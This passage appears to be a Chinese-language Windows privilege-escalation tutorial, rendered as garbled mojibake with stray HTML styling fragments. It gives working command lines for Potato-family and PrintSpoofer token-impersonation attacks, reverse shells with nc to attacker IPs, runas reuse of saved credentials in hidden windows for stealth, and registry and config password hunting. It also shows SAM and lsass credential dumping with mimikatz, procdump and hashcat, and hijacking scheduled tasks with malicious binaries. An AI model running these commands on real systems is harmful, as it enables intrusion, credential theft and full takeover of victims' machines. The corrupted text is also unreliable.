193, 0.2);CLSID.list/font.list æ–‡ä»¶ï¼Œå…¶ä¸­åˆ—å‡ºäº†åœ¨å„ç§ Windows ç‰ˆæœ¬ä¸­æµ‹è¯•è¿‡çš„ CLSIDã€‚ ä½ å¿…é¡»æ ¹æ®ç›®æ ‡ç³»ç»Ÿçš„ç‰ˆæœ¬ï¼Œä»è¿™ä¸ªåˆ—è¡¨ä¸­æŒ‘é€‰å‡ºä¸€ä¸ªæˆ–å¤šä¸ª CLSIDè¿›è¡Œå°è¯•ã€‚ ä¾‹å¦‚ï¼š Windows 10 Server 20162019 å¸¸ç”¨çš„ CLSID å¯èƒ½ä¸ Windows 7 Server 2008 ä¸åŒã€‚ ä¸€ä¸ªå†å²ä¸Šå¹¿æ³›ä½¿ç”¨çš„ CLSID æ˜¯ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);{4991d34b-80a1-4291-83b6-3328366b9097}/font (BITSæœåŠ¡)ã€‚ ç³»ç»Ÿæœªæ‰“è¡¥ä¸æˆ–é…ç½®æœªè¢«å¼ºåŒ– å¾®è½¯é€šè¿‡åç»­çš„æ›´æ–°å¯¹è¿™ç±»æ»¥ç”¨ COM æƒé™çš„è¡Œä¸ºè¿›è¡Œäº†é™åˆ¶ï¼ˆå°½ç®¡æ²¡æœ‰å®Œå…¨å°å µï¼‰ã€‚ æŸäº›å®‰å…¨è½¯ä»¶æˆ–ç»„ç­–ç•¥å¯èƒ½ä¼šé˜»æ­¢æœªç»æˆæƒçš„ COM æ¿€æ´»ã€‚ åˆ©ç”¨æµç¨‹ä¸å‚æ•°å¯¹åº”å…³ç³»å½“ä½ è¿è¡Œ Juicy Potato æ—¶ï¼Œè¿™äº›å‰ææ¡ä»¶ç›´æ¥ä½“ç°åœ¨å‘½ä»¤è¡Œå‚æ•°ä¸Šï¼š # ä¸€ä¸ªå…¸å‹çš„ Juicy Potato å‘½ä»¤ç¤ºä¾‹JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c CLSID **font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-c {CLSID}/font**: å¯¹åº”å‰æ #2 å’Œ #å’Œ #4ã€‚ä½ éœ€è¦åœ¨è¿™é‡Œå¡«å…¥ä¸€ä¸ªåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ç”¨çš„ CLSIDã€‚ **font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-t */font**: å¯¹åº”å‰æ #1ã€‚font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-t */font è¡¨ç¤ºå·¥å…·ä¼šè‡ªåŠ¨å°è¯•ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeImpersonatePrivilege/font æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeAssignPrimaryTokenPrivilege/fontã€‚ **font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-l 1337/font**: å¯¹åº”å‰æ #3ã€‚æŒ‡å®šä¸€ä¸ªæœ¬åœ°ç›‘å¬ç«¯å£ã€‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-l port port/font å‚æ•°åªæ˜¯å‘Šè¯‰ Juicy Potato å·¥å…·ï¼šâ€è¯·åœ¨å†…éƒ¨ä½¿ç”¨è¿™ä¸ªç«¯å£æ¥å®Œæˆæƒé™æ¬ºéª—è¿‡ç¨‹â€ã€‚æ‰€æœ‰çš„ç›‘å¬ã€é€šä¿¡ã€ä»¤ç‰Œçªƒå–éƒ½æ˜¯å·¥å…·è‡ªåŠ¨å®Œæˆçš„ï¼Œæ‚¨åªéœ€è¦ååœ¨å½“å‰çš„shellçª—å£ä¸­ç­‰å¾…æ–°çš„ SYSTEM æƒé™çš„ cmd.exe è¿›ç¨‹å¯åŠ¨å³å¯ã€‚ åœ¨ä½ å†³å®šä½¿ç”¨ Juicy Potato ä¹‹å‰ï¼Œè¯·æŒ‰æ­¤æ¸…å•æ£€æŸ¥ï¼š æƒé™æ£€æŸ¥ï¼šè¿è¡Œ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami /priv/fontï¼Œç¡®è®¤è¾“å‡ºä¸­ å·²å¯ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeImpersonatePrivilege/font æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeAssignPrimaryTokenPrivilege/fontã€‚ ç³»ç»Ÿè¯†åˆ«ï¼šç¡®å®šç›®æ ‡æœºå™¨çš„ Windows ç‰ˆæœ¬ï¼ˆå¦‚ Win10, Server 2012 R2ç­‰ï¼‰ã€‚ CLSID å‡†å¤‡ï¼šæ ¹æ®ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ï¼Œä» font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CLSID.list/font ä¸­æŒ‘é€‰å‡ ä¸ªå¯èƒ½çš„å€™é€‰ã€‚ æ‰§è¡Œå°è¯•ï¼šä½¿ç”¨ç±»ä¼¼ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œå°è¯•ï¼Œå¦‚æœå¤±è´¥ï¼Œæ›´æ¢ CLSID å†æ¬¡å°è¯•ã€‚ ç¬¬ä¸€æ¬¡å°è¯•ï¼Œä½¿ç”¨ä¸€ä¸ªé’ˆå¯¹ä½ ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬çš„ CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} å¦‚æœå¤±è´¥ï¼Œå°è¯•å¦ä¸€ä¸ª CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX} Rotten Potato(çƒ‚åœŸè±†)æ­¤æŠ€æœ¯ä¸é€‚ç”¨äº Windows 10 1809 å’Œ Windows Server 2019 çš„ç‰ˆæœ¬ 1.é€šè¿‡NT AUTHORITY/SYSTEMè¿è¡Œçš„RPCå°†å°è¯•é€šè¿‡CoGetInstanceFromIStorage APIè°ƒç”¨å‘æˆ‘ä»¬çš„æœ¬åœ°ä»£ç†è¿›è¡Œèº«ä»½éªŒè¯2.135 ç«¯å£çš„RPCå°†ç”¨äºå›å¤ç¬¬ä¸€ä¸ªRPCæ­£åœ¨æ‰§è¡Œçš„æ‰€æœ‰è¯·æ±‚å……å½“æ¨¡æ¿3.AcceptSecurityContextAPIè°ƒç”¨ä»¥åœ¨æœ¬åœ°æ¨¡æ‹ŸNT AUTHORITY/SYSTEM 1. ä½¿ç”¨CoGetInstanceFromIStorage API è°ƒç”¨æ¬ºéª—RPC,å¯¹ä»£ç†è¿›è¡Œèº«ä»½éªŒè¯.åœ¨æ­¤è°ƒç”¨ä¸­æŒ‡å®šäº†ä»£ç† IP/ç«¯å£2. RPC å‘ä»£ç†å‘é€ NTLM åå•†åŒ…3. ä»£ç†ä¾èµ–çš„NTLMåå•†åˆ°RPCåœ¨ç«¯å£135ï¼Œè¢«ç”¨ä½œæ¨¡æ¿ã€‚åŒæ—¶ï¼Œæ‰§è¡Œå¯¹AcceptSecurityContextçš„è°ƒç”¨ä»¥å¼ºåˆ¶è¿›è¡Œæœ¬åœ°èº«ä»½éªŒè¯æ³¨:æ­¤åŒ…è¢«ä¿®æ”¹ä¸ºå¼ºåˆ¶æœ¬åœ°èº«ä»½éªŒè¯.4. 5. RPC 135å’ŒAcceptSecurityContextç”¨NTLM Challengeå›å¤6. å°†ä¸¤ä¸ªæ•°æ®åŒ…çš„å†…å®¹æ··åˆä»¥åŒ¹é…æœ¬åœ°åå•†å¹¶è½¬å‘åˆ°RPC7. RPCä½¿ç”¨å‘é€åˆ°AcceptSecurityContext(8.)çš„NLTM AuthåŒ…è¿›è¡Œå“åº”ï¼Œå¹¶æ‰§è¡Œæ¨¡æ‹Ÿ(9.) Rogue Patato æ”»å‡»æœºå‡†å¤‡ï¼ˆKali æˆ–ä»»æ„ä½ æ§åˆ¶çš„ Linuxï¼‰1.1 å…ˆæŠŠ 135 ç«¯å£æŠ¢è¿‡æ¥ï¼Œåšè½¬å‘å™¨ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);sudo socat tcp-listen:135,reuseaddr,fork tcp:é¶æœºIP:9999/font 1.2 å†èµ·ä¸€ä¸ª nc ç­‰ä¼šæ¥æ”¶ SYSTEM åå‘ Shell font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);nc -nvlp 443/font æŠŠæ–‡ä»¶ä¸¢åˆ°é¶æœºåŒä¸€ç›®å½•ï¼ˆè¿™é‡Œç”¨ C:\\tempï¼‰ RoguePotato.exe ï¼ˆGitHub ç›´æ¥ä¸‹ Release å³å¯ ï¼‰ nc64.exe ï¼ˆåè¿è½½ä½“ï¼Œå¯æ¢æˆ msfps ç­‰ payloadï¼‰ é¶æœºä¸€æ¬¡æ‰§è¡Œ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);C:\\temp\\RoguePotato.exe -r æ”»å‡»æœºIP -l 9999 -e C:\\temp c64.exe æ”»å‡»æœºIP 443 -e cmd.exe/font å‚æ•°è§£é‡Š font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-r/font æ”»å‡»æœº IPï¼ˆsocat æ‰€åœ¨ï¼‰ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-l 9999/font æœ¬åœ°å‡ OXID è§£æå™¨ç›‘å¬ç«¯å£ï¼Œå¿…é¡»å’Œ socat è½¬å‘å¯¹åº” font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-e/font ææƒæˆåŠŸåä»¥ SYSTEM èº«ä»½å¯åŠ¨çš„å‘½ä»¤ï¼ˆè¿™é‡Œç»™ nc åå‘ shellï¼‰ SweetPotato GodPotatoåˆ©ç”¨ç¨‹åºå†…ç½®çš„ Clsid è¿›è¡Œæƒé™æå‡ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªç®€å•çš„å‘½ä»¤ã€‚ GodPotato -cmd cmd /c whoami æ‰§è¡Œåå‘ shell å‘½ä»¤ GodPotato -cmd nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012 PrintSpooferæ‚¨å¯ä»¥ä½¿ç”¨è¯¥é€‰é¡¹æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);-h/fontã€‚ C:\\TOOLSPrintSpoofer.exe -hPrintSpoofer v0.1 (by @itm4n) Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()Arguments: -c CMD Execute the command *CMD* -i Interact with the new process in the current command prompt (default is non-interactive) -d ID Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta) -h Thats me :)Examples: - Run PowerShell as SYSTEM in the current console PrintSpoofer.exe -i -c powershell.exe - Spawn a SYSTEM command prompt on the desktop of the session 1 PrintSpoofer.exe -d 1 -c cmd.exe - Get a SYSTEM reverse shell PrintSpoofer.exe -c c:\\Temp c.exe 10.10.13.37 1337 -e cmd ç”¨æ³• 1ï¼šå¯åŠ¨ä¸€ä¸ª SYSTEM è¿›ç¨‹å¹¶ä¸ä¹‹äº¤äº’å¦‚æœä½ æœ‰äº¤äº’å¼shellï¼Œä½ å¯ä»¥åœ¨å½“å‰æ§åˆ¶å°ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ SYSTEM è¿›ç¨‹ã€‚ ä½¿ç”¨åœºæ™¯ï¼šç»‘å®š shellã€åå‘ shellfont style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);psexec.py/fontç­‰ã€‚ C:\\TOOLSPrintSpoofer.exe -i -c cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OKMicrosoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system ç”¨æ³• 2ï¼šç”Ÿæˆä¸€ä¸ª SYSTEM è¿›ç¨‹å¹¶é€€å‡ºå¦‚æœä½ å¯ä»¥æ‰§è¡Œå‘½ä»¤ä½†æ²¡æœ‰äº¤äº’å¼ shellï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ SYSTEM è¿›ç¨‹ï¼Œç„¶åç«‹å³é€€å‡ºè€Œä¸ä¸ä¹‹äº¤äº’ã€‚ ä½¿ç”¨åœºæ™¯ï¼šWinRMã€WebShellfont style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);wmiexec.py/fontç­‰font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);smbexec.py/fontã€‚ åˆ›å»ºåå‘ shellï¼š C:\\TOOLSPrintSpoofer.exe -c C:\\TOOLS c.exe 10.10.13.37 1337 -e cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK Netcat ç›‘å¬å™¨ï¼š C:\\TOOLSnc.exe -l -p 1337Microsoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system ç”¨æ³• 3ï¼šåœ¨æ¡Œé¢ä¸Šå¯åŠ¨ SYSTEM è¿›ç¨‹å¦‚æœæ‚¨å·²æœ¬åœ°ç™»å½•æˆ–é€šè¿‡ RDPï¼ˆåŒ…æ‹¬ VDIï¼‰ç™»å½•ï¼Œåˆ™å¯ä»¥åœ¨æ¡Œé¢ä¸Šå¯åŠ¨ SYSTEM å‘½ä»¤æç¤ºç¬¦ã€‚é¦–å…ˆï¼Œä½¿ç”¨å‘½ä»¤æ£€æŸ¥æ‚¨çš„ä¼šè¯ ID font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);qwinsta/fontï¼Œç„¶åä½¿ç”¨é€‰é¡¹æŒ‡å®šæ­¤å€¼font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);-d/fontã€‚ ä½¿ç”¨åœºæ™¯ï¼šç»ˆç«¯ä¼šè¯ï¼ˆRDPï¼‰ã€VDI C:\\TOOLSqwinsta SESSIONNAME USERNAME ID STATE TYPE DEVICE services 0 Disc console Administrator 1 Activerdp-tcp#3 lab-user 3 Active rdp-tcp 65536 ListenC:\\TOOLSPrintSpoofer.exe -d 3 -c powershell -ep bypass[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK å¯†ç ç®¡ç†å‘˜ä¹Ÿä¼šé‡å¤ä½¿ç”¨å¯†ç ï¼Œæˆ–å°†å…¶å¯†ç ä¿ç•™åœ¨ä¸€äº›å¯è¯»ä½ç½®çš„ç³»ç»Ÿä¸Šã€‚ æ³¨å†Œè¡¨å¤§é‡ç¨‹åºåœ¨Windowsæ³¨å†Œè¡¨ä¸­å­˜å‚¨é…ç½®é€‰é¡¹ã€‚Windows æœ¬èº«æœ‰æ—¶ä¼šåœ¨æ³¨å†Œå¤„ä»¥çº¯æ–‡æœ¬å­˜å‚¨å¯†ç ã€‚ æœç´¢æ³¨å†Œè¡¨å¤„çš„å¯†ç (æ‰‹å·¥winPEAS)reg query HKLM /f password /t REG_SZ /s #æœ¬åœ°æœºå™¨æ³¨å†Œè¡¨é¡¹reg query HKCU /f password /t REG_SZ /s #å½“å‰ç”¨æˆ·æ³¨å†Œè¡¨é¡¹ å•å•ç¬¬ä¸€æ¡å‘½ä»¤è¿›è¡Œçš„ HKLM çš„æœç´¢ï¼Œå°±çœ‹åˆ°æ˜¾ç¤ºæœ‰ 293 ä¸ªåŒ¹é…ï¼Œè€Œè¿™ 293 æ¡ç»“æœä¸­è¿˜æœ‰å¾ˆå¤šæ— ç”¨çš„æ•°æ®æœ‰å¾…è®¤ä¸ºåˆ¤æ–­å¤„ç†ã€‚å¯ä»¥çœ‹å‡ºï¼Œè¿™ç§å¹¿æ³›æœç´¢æå…¶çš„è€—è´¹ç²¾åŠ›ï¼ ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥é›†ä¸­ç²¾åŠ›å»æŸ¥çœ‹åŒ…å«å¯†ç çš„å·²çŸ¥æ³¨å†Œè¡¨é¡¹ã€‚è¿™æ ·çš„æ³¨å†Œè¡¨é¡¹æ˜¯ winlogonï¼Œå®ƒä¸ Windows ä¸­è¢«ç§°ä¸º Autologonï¼ˆè‡ªåŠ¨ç™»å½•ï¼‰çš„åŠŸèƒ½ç›¸å…³ã€‚ font style=color:rgb(68, 68, 68);background-color:rgb(245, 245, 245);reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon/font é™¤äº† Windows è‡ªåŠ¨ç™»å½•åŠŸèƒ½å¤–ï¼ŒæŸäº›ç¨‹åºå’Œç¬¬ä¸‰æ–¹è½¯ä»¶ä¹Ÿå¯èƒ½ä¼šä»¥ä¸å®‰å…¨çš„æ–¹å¼åœ¨æ³¨å†Œè¡¨ä¸­å­˜å‚¨å‡­æ®ï¼Œè¿™äº›ç¬¬ä¸‰æ–¹è½¯ä»¶çš„æ³¨å†Œè¡¨è·¯å¾„å¦‚ä¸‹ reg query â€œHKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMPâ€ reg query â€œHKCU\\Software\\SimonTatham\\PuTTY\\Sessionsâ€ reg query â€œHKCU\\Software\\ORL\\WinVNC3\\Passwordâ€ reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 v password .\\winPEASany.exe quiet filesinfo userinfo å‡­è¯.\\winPEASany.exe quiet cmd windowscreds å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å­˜å‚¨çš„å‡­æ®ï¼š cmdkey /list å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·çš„å‡­è¯å·²ç»å­˜å‚¨åœ¨å‡­è¯ç®¡ç†å™¨ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥èº«ä»½å€ŸåŠ© runas å‘½ä»¤å»æ‰§è¡Œå‘½ä»¤å•¦ã€‚ å‡­è¯ç®¡ç†å™¨çš„æšä¸¾ï¼Œå¯¹äº PowerUp å’Œ winPEAS æ¥è¯´éƒ½ä¸èƒ½å¤Ÿå¸®åˆ°æˆ‘ä»¬ï¼Œå› æ­¤ï¼Œå‡­è¯ç®¡ç†å™¨çš„æšä¸¾éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œã€‚ã€PEAS è™½ç„¶æ”¯æŒæšä¸¾å­˜å‚¨çš„å‡­è¯ï¼Œä½†ä½¿ç”¨æ•ˆæœä¸ä½³ï¼Œæ€»æ˜¯å¤±è´¥ã€‚ã€‘ è™½ç„¶è¿™å¹¶éçœŸæ­£çš„â€œå¯†ç æœå¯»â€ï¼Œä½†ç”±äºç”¨æˆ·çš„å¯†ç è¢«ä¿å­˜ï¼Œè€Œå®ƒç¡®å®å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›ä»¥å…¶å®ƒç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚å› æ­¤ï¼Œè¿™å®é™…ä¸Šç­‰åŒäºåœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æŸä¸ªç”¨æˆ·çš„å‡­æ®ã€‚ å¦‚æœå°è¯•è¿è¡Œä»»æ„å‘½ä»¤ï¼ˆä¾‹å¦‚â€œwhoamiâ€ï¼‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†è¾“å‡ºå†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ä»¥è¯»å–å®ƒã€‚è¿™æ˜¯å› ä¸º runas ä¼šåœ¨å¦å¤–æ–°èµ·çš„çª—å£ä¸­å»æ‰§è¡Œå‘½ä»¤ï¼Œå‘½ä»¤æ‰§è¡Œç»“æŸæ–°èµ·çš„çª—å£å°±è¢«å…³é—­äº†ï¼Œå› æ­¤è¾“å‡ºçš„å†…å®¹å¹¶ä¸ä¼šå‘ˆç°åœ¨å½“å‰çš„ shell çª—å£ä¸­ã€‚ runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator cmd.exe /c whoami C:\\temp\\whoami.txt ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç¡®å®æ˜¯ä»¥æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·çš„èº«ä»½è¿è¡Œäº† whoami å‘½ä»¤ï¼æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥ä½¿ç”¨ runas æ¥å€ŸåŠ© nc.exe å·¥å…·æ¥è·å–åå‘ shellï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator c:\\temp c.exe 172.16.1.30 443 -e cmd.exe å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™å¯èƒ½ä¼šåœ¨å—å®³è€…æœºå™¨ä¸Šæ‰“å¼€ cmd çª—å£ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è½»æ¾å…³é—­å®ƒã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ PowerShell ä»éšè—çª—å£æ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œå¢åŠ éšè”½æ€§ã€‚è¿™æ ·ï¼Œå—å®³è€…é‚£è¾¹å°±ä¸ä¼šæ‰“å¼€ä»»ä½•çª—å£ï¼Œä¹Ÿå°±ä¸ä¼šé‚£ä¹ˆè½»æ¾çš„å°±æ€æ­»æˆ‘ä»¬çš„ shellã€‚ runas /env /noprofile /savecred /user:JUGG-efrost\\administrator powershell.exe -w hidden -c c:\\temp c.exe 172.16.1.30 443 -e cmd.exe æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰å¯¹å—å®³è€…æœºå™¨çš„è¿œç¨‹æ¡Œé¢æƒé™ï¼Œé‚£ä¹ˆä¾¿ä¸éœ€è¦åƒä¸Šé¢é‚£ä¹ˆéº»çƒ¦ï¼Œåªéœ€ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ã€‚ runas /env /noprofile /savecred /user:JUGG-efrost\\administrator cmd é…ç½®æ–‡ä»¶æœç´¢é…ç½®æ–‡ä»¶å¸¸è§é…ç½®æ–‡ä»¶ä½ç½® C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xmlï¼ˆå¸¸è§ï¼‰ C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.xml C:\\Windows\\system32\\sysprep\\sysprep.xml é€’å½’å¼æœç´¢å½“å‰ç›®å½•ä¸­ä»¥font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);pass/fontä¸ºåçš„æ–‡ä»¶ï¼Œæˆ–ä»¥font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.config/fontç»“å°¾ï¼š dir /s *pass* == *.config é€’å½’å¼æœç´¢å½“å‰ç›®å½•ä¸­åŒ…å«â€passwordâ€ä¸€è¯çš„æ–‡ä»¶ï¼Œæœ€åä¹Ÿä»¥ä»»ä½•ä¸€ä¸ªfont style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.xml/fontï¼Œfont style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.ini/fontï¼Œfont style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.txt/font findstr /si password *.xml *.ini *.txt .\\winPEASany.exe quiet cmd searchfast filesinfo æˆ–è€…PowerUp çŸ¥é“å¯†ç åï¼Œå¯ä»¥ç”¨winexeåå¼¹shell SAMWindowsç³»ç»Ÿä¸‹çš„hashå¯†ç æ ¼å¼ç”¨æˆ·åç§°:RID:LM-HASHå€¼:NT-HASHå€¼ ä¾‹å¦‚ï¼š Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4::: ç”¨æˆ·åç§°ä¸ºï¼šAdministrator RIDä¸ºï¼š500 LM-HASHå€¼ä¸ºï¼šC8825DB10F2590EAAAD3B435B51404EE NT-HASHå€¼ä¸ºï¼š32ED87BDB5FDC5E9CBA88547376818D4 é€šè¿‡SAMæ–‡ä»¶+mimikatzè¯»å–å¯†ç windowsçš„ç”¨æˆ·hashä¸€èˆ¬æ˜¯å­˜å‚¨åœ¨C:\\windows\\system32\\config\\SAMæ–‡ä»¶ä¸­ï¼ˆåŸŸæ§å­˜åœ¨NTDS.ditæ–‡ä»¶ä¸­ï¼‰ï¼Œåªä¸è¿‡ï¼Œå°±ç®—æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œä¹Ÿæ˜¯æ— æ³•æ­£å¸¸æ‰“å¼€å¹¶è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå› æ­¤ä¸€èˆ¬æ— æ³•ç›´æ¥é€šè¿‡SAMæ–‡ä»¶è·å–ç”¨æˆ·hashã€‚ reg save hklm\\sam C:\\hash\\sam.hive reg save hklm\\system C:\\hash\\system.hive å°†ä¸Šè¿°è·å¾—çš„sys.hivå’Œsam.hivæ–‡ä»¶å¤åˆ¶åˆ°mimikatzæ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œè¿è¡Œmimikatzï¼Œ è¾“å…¥font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);lsadump::sam /system:sys.hiv /sam:sam.hiv/fontï¼Œå³å¯å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·å¯†ç hash ä¸‹è½½ä¿¡ç”¨å¥—ä»¶ï¼šgit clone https://github.com/Neohapsis/creddump7.git è¿è¡Œå¯¹SAMå’Œç³»ç»Ÿæ–‡ä»¶çš„å·¥å…·æ¥æå–å“ˆå¸Œï¼špython2 creddump7/pwdump.py SYSTEM SAM ä½¿ç”¨hashcatç ´è§£ç®¡ç†å‘˜ç”¨æˆ·å“ˆå¸Œï¼šhashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt åœ¨ Windows è¿è¡Œæ—¶ï¼Œæ–‡ä»¶å·²é”å®šã€‚æ–‡ä»¶çš„å¤‡ä»½å¯èƒ½å­˜åœ¨äºfont style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);C:\\Windows\\Repair/font or font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);C:\\Windows\\System32\\config\\RegBack directories/font lsass.exe è¿›ç¨‹lsass.exeæ˜¯ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºæœ¬åœ°å®‰å…¨è®¤è¯ï¼Œç”¨æˆ·çš„hashä¿¡æ¯å°±å­˜åœ¨lsass.exeç¨‹åºå†…å­˜ä¸­ã€‚æˆ‘ä»¬ä¸€èˆ¬å°±æ˜¯ä»¥lsass.exeè¿›ç¨‹ä¸ºç›®æ ‡ï¼Œä½¿ç”¨å·¥å…·ä»è¯¥è¿›ç¨‹ä¸­dumpå‡ºå·²ç™»å½•ç”¨æˆ·çš„hashç›¸å…³ä¿¡æ¯ ä½†å¯ä»¥é€šè¿‡æ³¨å†Œè¡¨å¯¼å‡ºsamå’Œsystemæ–‡ä»¶ procdump64(å¾®è½¯è‡ªå·±çš„å·¥å…·)+mimikatzprocdump64.exe -accepteula -ma lsass.exe lsass.dmp ä½¿ç”¨æœ¬åœ°çš„mimikatz.exeè¯»å–lsass.dmp Scheduled TasksæŸ¥çœ‹è®¡ç®—æœºä¸Šä»¥ç®¡ç†æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚schtasks /query /fo LIST /vschtasks /query /fo list /v schtasks.txtschtasks /query /fo LIST /v | findstr ç®¡ç†å‘˜schtasks /query /fo LIST /v | findstr Snipaste ä½¿ç”¨AccessChkæŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨ç›®å½•å…·æœ‰å†™å…¥æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–æ‰åŸæ¥çš„ç¨‹åºã€‚ accesschk -dqv C:/Program Files/Snipaste-1.16.2-x86 -accepteula å…·æœ‰å†™å…¥æƒé™ï¼Œå°†æ¶æ„ç¨‹åºæ”¾å…¥å¯¹åº”ç›®å½•ä¸‹ã€‚ æ‰§è¡Œé‡å¯å‘½ä»¤ã€‚å½“è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™è¿è¡Œæ¶æ„ç¨‹åºï¼Œè¿›è€Œå®Œæˆææƒã€‚æˆåŠŸææƒåè®°å¾—ä¿®æ”¹å›é…ç½®ã€‚ shutdown -r -t 0 